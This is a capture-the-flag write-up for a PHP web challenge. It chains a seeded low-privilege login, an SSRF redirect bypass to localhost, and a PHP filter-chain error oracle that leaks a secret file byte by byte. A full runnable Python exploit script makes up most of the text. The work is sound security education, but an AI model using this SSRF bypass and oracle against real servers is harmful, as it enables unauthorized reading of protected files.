# web/erp-system

## Overview

The attachment gives three pieces that fit together directly:

- `db/initdb.d/init.sql` gives a working low-privilege login
- `app/src/hash.php` gives an SSRF plus attacker-controlled outer PHP filter chain
- `app/src/secret.php` gives the real secret read, but only from `127.0.0.1`

The solve path is:

1. Log in with the seeded user from `init.sql`.
2. Use `hash.php` to fetch a public redirector URL.
3. Make that redirector send the request to `127.0.0.1/secret.php`.
4. Pass a valid inner filter so `secret.php` actually reads `/secret/secret_<index>`.
5. Use the outer filter chain in `hash.php` as a PFCOE-style oracle.
6. Recover one byte per `secret_<index>` file and join them into the flag.

## Exploit Chain

1. Start from the attachment. The first required primitive is in `db/initdb.d/init.sql`: a working account was `mkim / erp123`.

2. The next primitive is in `app/src/hash.php`. This file shows that the application will fetch a user-controlled URL, but only if the original URL is public `http://`. It also applies an attacker-controlled PHP filter chain to the fetched body.

   ```php
   $filter = $_GET['filter'] ?? '';
   $resource = $_GET['resource'] ?? '';
   ...
   if (strtolower($scheme) !== 'http') {
       die("Error: Only valid HTTP URLs are allowed.");
   }
   ...
   $ip = gethostbyname($host);
   if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
       die("Error: Access to local/private network is prohibited.");
   }
   $target = "php://filter/read=" . $filter . "|hash.sha256" . "/resource=" . $resource;
   $content = file_get_contents($target);
   echo $content;
   ```

   This is the first half of the chain:

   - `resource` can point to a public HTTP server
   - `file_get_contents()` performs the fetch
   - the response body is processed through our outer filter chain before `hash.sha256`

3. The actual secret read is exposed by `app/src/secret.php`. That file shows exactly what must be satisfied before a secret byte can be returned.

   ```php
   $ip = $_SERVER['REMOTE_ADDR'];

   if($ip != '127.0.0.1') {
       die("Error: You are not authorized to access this page!");
   }
   ...
   $filter = $_GET['filter'] ?? '';
   ...
   if (!preg_match('/^[a-zA-Z0-9.|_-]+$/', $filter)) {
       die("Error: Invalid characters or syntax found.");
   }

   $target = "php://filter/read=" . $filter . "/resource=" . "/secret/secret_" . $index;
   $content = file_get_contents($target);
   echo "Secret: " . $content . "/" . $index . "/" . $salt;
   ```

   This gives the second half of the chain:

   - the request must arrive from `127.0.0.1`
   - `index` selects which `/secret/secret_<index>` file to read
   - `filter` is mandatory and must match `^[a-zA-Z0-9.|_-]+$`
   - the response format is `Secret: <content>/<index>/<salt>`

4. `hash.php` cannot request `http://127.0.0.1/...` directly because it blocks private destinations during its initial validation. The working bypass is to make the original `resource` a public URL that returns an HTTP redirect.

   Working shape:

   ```text
   http://httpbin.org/redirect-to?url=http://127.0.0.1/secret.php?index=N&filter=string.reverse
   ```

   This works because:

   - the original URL is public `http://`, so `hash.php` accepts it
   - `file_get_contents()` follows the redirect
   - the second hop goes to `127.0.0.1`, so `secret.php` sees a localhost request
   - `string.reverse` satisfies the required `filter` parameter in `secret.php`

5. The inner filter matters. `secret.php` does not read the file unless `filter` is present and valid. `string.reverse` is the simplest safe choice because each `/secret/secret_<index>` file is one byte long, so reversing it leaves the value unchanged. After the redirect lands correctly, the body format becomes:

   ```text
   Secret: <char>/<index>/<random_salt>
   ```

   The trailing salt is random on every request, so the exploit cannot rely on the full output being stable. The stable part is only the prefix through the secret byte. That byte is always at offset `8`:

   ```text
   S e c r e t : _ X
   0 1 2 3 4 5 6 7 8
   ```

6. The outer filter in `hash.php` is then used as an error oracle. The solve script uses a PFCOE-style chain: it base64-encodes the target body, moves to the desired base64 position with `get_nth()`, and distinguishes characters by triggering or not triggering an out-of-memory error with repeated `convert.iconv.L1.UCS-4`.

   At a high level, the oracle does this:

   - `convert.base64-encode` turns the unknown response body into a base64 string
   - `get_nth()` shifts the byte position so one base64 character can be tested
   - `dechunk` plus repeated `convert.iconv.L1.UCS-4` creates the 500-vs-not-500 side channel
   - `string.rot13`, `string.tolower`, and several `convert.iconv.*` branches classify the current base64 character

   The important point is that the exploit does not recover the full `Secret: ... / salt` body. It only recovers the four base64 characters covering the three-byte decoded window that contains:

   ```text
   : X
   ```

   The third decoded byte is the secret character for that index.

7. For each `index`, the script builds the redirect URL, runs the oracle against base64 positions `8..11`, decodes those four base64 characters, and extracts the third decoded byte. That produces one secret character from `/secret/secret_<index>`.

8. Repeat for `index=0,1,2,...`. Stop when the recovered character becomes `/`. At that point the response window is effectively:

   ```text
   : /
   ```

   and the previous bytes we obtained are the full flag.

## Final Solve


```python
#!/usr/bin/env python3
import argparse
import base64
import sys
import time

import requests


class BruteforceError(Exception):
    pass


class Bruteforcer:
    # Adapted from Synacktiv's php_filter_chains_oracle_exploit, trimmed for this challenge.
    BLOW_UP_UTF32 = "convert.iconv.L1.UCS-4"
    BLOW_UP_INFINITY = "|".join([BLOW_UP_UTF32] * 15)
    HEADER = "convert.base64-encode"
    R4 = "convert.iconv.UCS-4LE.UCS-4"
    R2 = "convert.iconv.CSUNICODE.UCS-2BE"
    ROT1 = "convert.iconv.437.CP930"
    BE = "convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode"
    FLIP = "convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.UCS-4|convert.base64-decode|convert.base64-encode"
    FLIP_WARNING_FRIENDLY = (
        "convert.quoted-printable-encode|convert.quoted-printable-encode|"
        "convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|"
        "convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.UCS-4|convert.base64-decode|convert.base64-encode"
    )

    def __init__(self, offset: int) -> None:
        self.offset = offset

    def send(self, filters: str) -> bool:
        raise NotImplementedError

    def get_nth(self, n: int) -> str:
        out = []
        chunk = n // 2
        if chunk % 2 == 1:
            out.append(self.R4)
        out.extend([self.FLIP, self.R4] * int(chunk // 2))
        if (n % 2 == 1) ^ (chunk % 2 == 1):
            out.append(self.R2)
        return "|".join(out)

    def find_letter(self, prefix: str) -> str:
        if not self.send(f"{prefix}|dechunk|{self.BLOW_UP_INFINITY}"):
            if not self.send(f"{prefix}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"):
                for n in range(5):
                    if self.send(
                        f"{prefix}|"
                        + f"{self.ROT1}|{self.BE}|" * (n + 1)
                        + f"{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
                    ):
                        return "edcba"[n]
                return False
            elif not self.send(
                f"{prefix}|string.tolower|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                for n in range(5):
                    if self.send(
                        f"{prefix}|string.tolower|"
                        + f"{self.ROT1}|{self.BE}|" * (n + 1)
                        + f"{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
                    ):
                        return "EDCBA"[n]
                return False
            elif not self.send(
                f"{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "*"
            elif not self.send(
                f"{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "f"
            elif not self.send(
                f"{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "F"
            return False
        elif not self.send(f"{prefix}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"):
            if not self.send(
                f"{prefix}|string.rot13|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                for n in range(5):
                    if self.send(
                        f"{prefix}|string.rot13|"
                        + f"{self.ROT1}|{self.BE}|" * (n + 1)
                        + f"{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
                    ):
                        return "rqpon"[n]
                return False
            elif not self.send(
                f"{prefix}|string.rot13|string.tolower|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                for n in range(5):
                    if self.send(
                        f"{prefix}|string.rot13|string.tolower|"
                        + f"{self.ROT1}|{self.BE}|" * (n + 1)
                        + f"{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
                    ):
                        return "RQPON"[n]
                return False
            elif not self.send(
                f"{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "s"
            elif not self.send(
                f"{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "S"
            return False
        elif not self.send(
            f"{prefix}|{self.ROT1}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            if not self.send(
                f"{prefix}|convert.iconv.UTF8.IBM1140|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "+"
            elif self.send(
                f"{prefix}|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "k"
            elif self.send(
                f"{prefix}|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "j"
            elif self.send(
                f"{prefix}|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "i"
            return False
        elif not self.send(
            f"{prefix}|string.tolower|{self.ROT1}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            if self.send(
                f"{prefix}|string.tolower|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "K"
            elif self.send(
                f"{prefix}|string.tolower|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "J"
            elif self.send(
                f"{prefix}|string.tolower|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "I"
            return False
        elif not self.send(
            f"{prefix}|string.rot13|{self.ROT1}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            if self.send(
                f"{prefix}|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "x"
            elif self.send(
                f"{prefix}|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "w"
            elif self.send(
                f"{prefix}|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "v"
            return False
        elif not self.send(
            f"{prefix}|string.tolower|string.rot13|{self.ROT1}|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            if self.send(
                f"{prefix}|string.tolower|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "X"
            elif self.send(
                f"{prefix}|string.tolower|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "W"
            elif self.send(
                f"{prefix}|string.tolower|string.rot13|{self.ROT1}|string.rot13|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|{self.BE}|{self.ROT1}|dechunk|{self.BLOW_UP_INFINITY}"
            ):
                return "V"
            return False
        elif not self.send(
            f"{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "Z"
        elif not self.send(
            f"{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "z"
        elif not self.send(
            f"{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "M"
        elif not self.send(
            f"{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "m"
        elif not self.send(
            f"{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "y"
        elif not self.send(
            f"{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "Y"
        elif not self.send(
            f"{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "l"
        elif not self.send(
            f"{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "L"
        elif not self.send(
            f"{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "h"
        elif not self.send(
            f"{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "H"
        elif not self.send(
            f"{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "u"
        elif not self.send(
            f"{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "U"
        elif not self.send(
            f"{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "g"
        elif not self.send(
            f"{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "G"
        elif not self.send(
            f"{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "t"
        elif not self.send(
            f"{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "T"
        elif not self.send(
            f"{prefix}|convert.iconv.UTF8.CP930|dechunk|{self.BLOW_UP_INFINITY}"
        ):
            return "/"
        return "*"

    def find_number(self, i: int) -> str:
        prefix = f"{self.HEADER}|{self.get_nth(i)}|convert.base64-encode"
        letter = self.find_letter(prefix)

        if letter == "M":
            prefix = f"{self.HEADER}|{self.get_nth(i)}|convert.base64-encode|{self.R2}"
            ss = self.find_letter(prefix)
            if ss in "CDEFGH":
                return "0"
            if ss in "STUVWX":
                return "1"
            if ss in "ijklmn":
                return "2"
            if ss in "yz*":
                return "3"
        elif letter == "N":
            prefix = f"{self.HEADER}|{self.get_nth(i)}|convert.base64-encode|{self.R2}"
            ss = self.find_letter(prefix)
            if ss in "CDEFGH":
                return "4"
            if ss in "STUVWX":
                return "5"
            if ss in "ijklmn":
                return "6"
            if ss in "yz*":
                return "7"
        elif letter == "O":
            prefix = f"{self.HEADER}|{self.get_nth(i)}|convert.base64-encode|{self.R2}"
            ss = self.find_letter(prefix)
            if ss in "CDEFGH":
                return "8"
            if ss in "STUVWX":
                return "9"
        return "*"

    def find_value(self, i: int) -> str:
        while True:
            prefix = f"{self.HEADER}|{self.get_nth(i)}"
            letter = self.find_letter(prefix)
            if letter == "*":
                letter = self.find_number(i)
            if letter == "*" and self.FLIP != self.FLIP_WARNING_FRIENDLY:
                self.FLIP = self.FLIP_WARNING_FRIENDLY
            else:
                break
        return letter


class ERP2Oracle(Bruteforcer):
    def __init__(self, session: requests.Session, hash_url: str, resource: str, retries: int, timeout: float):
        super().__init__(offset=8)
        self.session = session
        self.hash_url = hash_url
        self.resource = resource
        self.retries = retries
        self.timeout = timeout

    def send(self, filters: str) -> bool:
        last_error = None
        for attempt in range(self.retries):
            try:
                response = self.session.get(
                    self.hash_url,
                    params={"filter": filters, "resource": self.resource},
                    timeout=self.timeout,
                )
                return response.status_code == 500
            except requests.RequestException as exc:
                last_error = exc
                time.sleep(1.0 + attempt)
        raise last_error


def build_redirect_resource(base_url: str, index: int, inner_filter: str, redirector: str) -> str:
    from urllib.parse import quote

    inner = f"{base_url}/secret.php?index={index}&filter={inner_filter}"
    return redirector.format(url=quote(inner, safe=':/?='))


def leak_char(session: requests.Session, hash_url: str, resource: str, retries: int, timeout: float) -> str:
    oracle = ERP2Oracle(session, hash_url, resource, retries=retries, timeout=timeout)
    block = ""
    for i in range(8, 12):
        ch = oracle.find_value(i)
        if not ch:
            raise BruteforceError(f"failed to recover base64 char at position {i}")
        block += ch

    decoded = base64.b64decode(block)
    if len(decoded) < 3:
        raise BruteforceError(f"decoded block too short: {decoded!r}")
    return chr(decoded[2])


def login(session: requests.Session, login_url: str, username: str, password: str, timeout: float) -> None:
    response = session.post(
        login_url,
        data={"username": username, "password": password},
        timeout=timeout,
        allow_redirects=False,
    )
    if response.status_code not in (200, 302):
        raise RuntimeError(f"login failed with status {response.status_code}")


def main() -> int:
    parser = argparse.ArgumentParser(description="ERP2 solver")
    parser.add_argument("--base-url", default="http://16.184.35.242", help="Challenge base URL")
    parser.add_argument("--username", default="mkim", help="Low-privileged account username")
    parser.add_argument("--password", default="erp123", help="Low-privileged account password")
    parser.add_argument(
        "--redirector",
        default="http://httpbin.org/redirect-to?url={url}",
        help="Public HTTP redirector template",
    )
    parser.add_argument("--inner-filter", default="string.reverse", help="Valid inner secret.php filter")
    parser.add_argument("--max-index", type=int, default=64, help="Stop after this many slots")
    parser.add_argument("--timeout", type=float, default=25.0, help="Per-request timeout")
    parser.add_argument("--retries", type=int, default=5, help="Retries per oracle request")
    args = parser.parse_args()

    base_url = args.base_url.rstrip("/")
    login_url = f"{base_url}/login.php"
    hash_url = f"{base_url}/hash.php"

    session = requests.Session()
    login(session, login_url, args.username, args.password, args.timeout)

    recovered = []
    for index in range(args.max_index):
        resource = build_redirect_resource(base_url, index, args.inner_filter, args.redirector)
        ch = leak_char(session, hash_url, resource, args.retries, args.timeout)
        print(f"[{index:02d}] {ch}", flush=True)
        if ch == "/":
            break
        recovered.append(ch)

    flag = "".join(recovered)
    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

run:

```bash
python3 ./solve.py
```